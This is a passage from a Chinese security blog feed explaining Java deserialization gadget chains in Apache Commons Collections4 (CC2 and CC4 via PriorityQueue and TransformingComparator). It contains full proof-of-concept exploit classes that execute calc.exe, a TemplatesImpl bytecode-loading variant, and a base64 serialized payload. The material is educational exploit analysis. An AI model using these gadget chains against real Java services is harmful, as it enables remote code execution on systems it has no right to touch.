class="hljs-comment">//输出rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAVzK/rq+AAAANAAbCgAGAA0JAA4ADwgAEAoAEQASBwATBwAUAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhDAAHAAgHABUMABYAFwEAC0hlbGxvIFdvcmxkBwAYDAAZABoBAAVIZWxsbwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAEAAQAHAAgAAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAAIABAAEAAwABQABAAsAAAACAAxwdAASSGVsbG9UZW1wbGF0ZXNJbXBscHcBAHhxAH4ADXg=</span><br><br></code></pre></td></tr></table></figure><p>修改成这样后即可成功执行</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CC4与漏洞修复</title>
    <link href="/Decemberus.github-io/2022/11/16/CC4%E4%B8%8E%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D(3)/"/>
    <url>/Decemberus.github-io/2022/11/16/CC4%E4%B8%8E%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D(3)/</url>
    
    <content type="html"><![CDATA[<h1 id="CC4与漏洞修复"><a href="#CC4与漏洞修复" class="headerlink" title="CC4与漏洞修复"></a>CC4与漏洞修复</h1><p>Apache Commons Collections有以下两个分⽀版本：</p><ul><li><p>commons-collections:commons-collections</p></li><li><p>org.apache.commons:commons-collections4</p></li></ul><p>前面讲的CC系列的利用链都是用的第一个CC版本，那么第二个4.0版本能否存在呢</p><h2 id="CC4的改动"><a href="#CC4的改动" class="headerlink" title="CC4的改动"></a>CC4的改动</h2><p>pom.xml中可以看到CC的版本号</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191232275.png" alt="image-20230218145946665"> </p><p>然后，因为⽼的Gadget中依赖的包名都是 <code>org.apache.commons.collections</code> ，⽽新的包名已经变了，是 <code>org.apache.commons.collections4</code> 。</p><p>我们⽤已经熟悉的<code>CommonsCollections6</code>利⽤链做个例⼦，我们直接把代码拷⻉⼀遍，然后将所有 <code>import org.apache.commons.collections.*</code> 改成 <code>import org.apache.commons.collections4.*</code> 。</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191236764.png" alt="image-20230218150226112"> </p><p>但是此时LazyMap.decorate这个方法没了</p><p>3中decorate的定义是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>而在4中换了个名字叫lazyMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="hljs-title function_">lazyMap</span><span class="hljs-params">(Map&lt;K, V&gt; map, Transformer&lt;? <span class="hljs-built_in">super</span> K, ? extends V&gt; factory)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>&lt;V, K&gt;和&lt;K, V&gt;分别代表什么意思？</p><p>在这个方法中，”&lt;V, K&gt;”指定了返回的LazyMap对象的键类型为K，值类型为V。而在LazyMap类的定义中，键和值的类型是反过来的，因此定义为”&lt;K, V&gt;”。具体来说，LazyMap类的定义为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span>&lt;K, V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K, V&gt; &#123;<br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在这个定义中，K指代键类型，V指代值类型。因此，在这个方法中，”&lt;V, K&gt;”指代返回的LazyMap对象的值类型为V，键类型为K。</p></blockquote><p>于是将报错的那一段代码更改一下名字，换成lazyMap方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Map outerMap = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span><span class="hljs-keyword">lazy</span><span class="hljs-constructor">Map(<span class="hljs-params">innerMap</span>, <span class="hljs-params">transformerChain</span>)</span>;<br></code></pre></td></tr></table></figure><p>运行，成功弹出计算器</p><h2 id="PriorityQueue利用链"><a href="#PriorityQueue利用链" class="headerlink" title="PriorityQueue利用链"></a>PriorityQueue利用链</h2><p>除了⽼的⼏个利⽤链，ysoserial还为commons-collections4准备了两条新的利⽤链，那就是CommonsCollections2和CommonsCollections4。</p><p>commons-collections这个包之所有能攒出那么多利⽤链来，除了因为其使⽤量⼤，技术上的原因是其中包含了⼀些可以执⾏任意⽅法的Transformer。所以，在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从<code>Serializable#readObject()</code> ⽅法到 <code>Transformer#transform()</code>⽅法的调⽤链。</p><p>有了这个认识，我们再来看CommonsCollections2，其中⽤到的两个关键类是：</p><ul><li><p>java.util.PriorityQueue</p></li><li><p>org.apache.commons.collections4.comparators.TransformingComparator</p></li></ul><p><code>java.util.PriorityQueue</code>有自己的<code>readObject()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">// Read in size, and any hidden stuff</span><br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Read in (and discard) array length</span><br>    s.readInt();<br><br>    queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br><br>    <span class="hljs-comment">// Read in all elements.</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>        queue[i] = s.readObject();<br><br>    <span class="hljs-comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br>    <span class="hljs-comment">// spec has never explained what that might be.</span><br>    heapify();<br>&#125;<br></code></pre></td></tr></table></figure><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code> 中有调⽤ transform() ⽅法的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(I obj1, I obj2)</span> &#123;<br>        <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>        <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>    &#125;<br></code></pre></td></tr></table></figure><p>所以，CommonsCollections2实际就是⼀条从 <code>PriorityQueue</code> 到 <code>TransformingComparator</code> 的利⽤链。</p><p>那我们先从<code>PriorityQueue</code>分析到<code>TransformingComparator</code></p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191236320.png" alt="image-20230218203602466"> </p><p><code>PriorityQueue#readObject</code>调用了<code>heapify()</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191236785.png" alt="image-20230218203724775"> </p><p>调用siftDown()方法</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191236443.png" alt="image-20230218203905654"> </p><p>调用了<code>siftDownUsingComparator()</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191236181.png" alt="image-20230218204141295"> </p><p>调用<code>compare()</code>方法</p><p>而这里调用的compare方法恰好是<code>TransformingComparator</code>所调用的</p><p>利用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>   PriorityQueue.readObject()<br>      ...<br>         TransformingComparator.compare()<br>            InvokerTransformer.transform()<br>               Method.invoke()<br>                  Runtime.exec()<br></code></pre></td></tr></table></figure><h2 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">PriorityQueue</span><span class="hljs-params">(Comparator&lt;? <span class="hljs-built_in">super</span> E&gt; comparator)</span> &#123;<br>    <span class="hljs-built_in">this</span>(DEFAULT_INITIAL_CAPACITY, comparator);<br>&#125;<br></code></pre></td></tr></table></figure><p>先创建一个Transformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] fakeTransformer =<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;<span class="hljs-keyword">new</span>  <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>Transformer[] transformers =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span> &#125;),<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformer);<br></code></pre></td></tr></table></figure><p>再创建一个<code>TransformingComparator</code>,传入我们的<code>chainedTransformer</code>,这里不一定要用到多态，可以不使用指向父类的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br></code></pre></td></tr></table></figure><p>实例化 PriorityQueue 对象，第⼀个参数是初始化时的⼤⼩，⾄少需要2个元素才会触发排序和⽐较，所以是2，然后随便加两个数字进入；第二个参数是比较是用到的Comparator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, transformingComparator);<br>priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>最后，用反射加入真正的Transformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldName,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj,value);<br>    &#125;<br></code></pre></td></tr></table></figure><p>完整的poc如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2_POC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] fakeTransformer =<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;<span class="hljs-keyword">new</span>  <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span> &#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformer);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, transformingComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(priorityQueue);<br>        oos.close();<br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldName,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj,value);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行后成功弹出计算器</p><h2 id="改进PriorityQueue利用链"><a href="#改进PriorityQueue利用链" class="headerlink" title="改进PriorityQueue利用链"></a>改进PriorityQueue利用链</h2><p>尝试使用TemplatesImpl来构造改进，不用创建Transformer数组</p><p>先创建TemplatesImpl对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getBytescode()&#125;);<br>setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>创建<code>InvokerTransformer</code>对象，并用来实例化<code>Comparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br></code></pre></td></tr></table></figure><p>还是像上⼀节⼀样实例化 PriorityQueue ，但是此时向队列⾥添加的元素就是我们前⾯创建的TemplatesImpl 对象了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>queue.add(obj);<br>queue.add(obj);<br></code></pre></td></tr></table></figure><p>原因很简单，和上⼀篇⽂章相同，因为我们这⾥⽆法再使⽤Transformer数组，所以也就不能⽤ ConstantTransformer 来初始化变量，需要接受外部传⼊的变量。⽽在 Comparator#compare()时，队列⾥的元素将作为参数传⼊ transform() ⽅法，这就是传给 TemplatesImpl#newTransformer的参数。</p><p>最后⼀步，将 toString ⽅法改成恶意⽅法 newTransformer ：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">set<span class="hljs-constructor">FieldValue(<span class="hljs-params">transformer</span>, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>)</span>;<br></code></pre></td></tr></table></figure><p>完整的POC如下所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections2TemplatesImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getBytescode() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.get(evil.EvilTemplatesImpl.class.getName());<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span 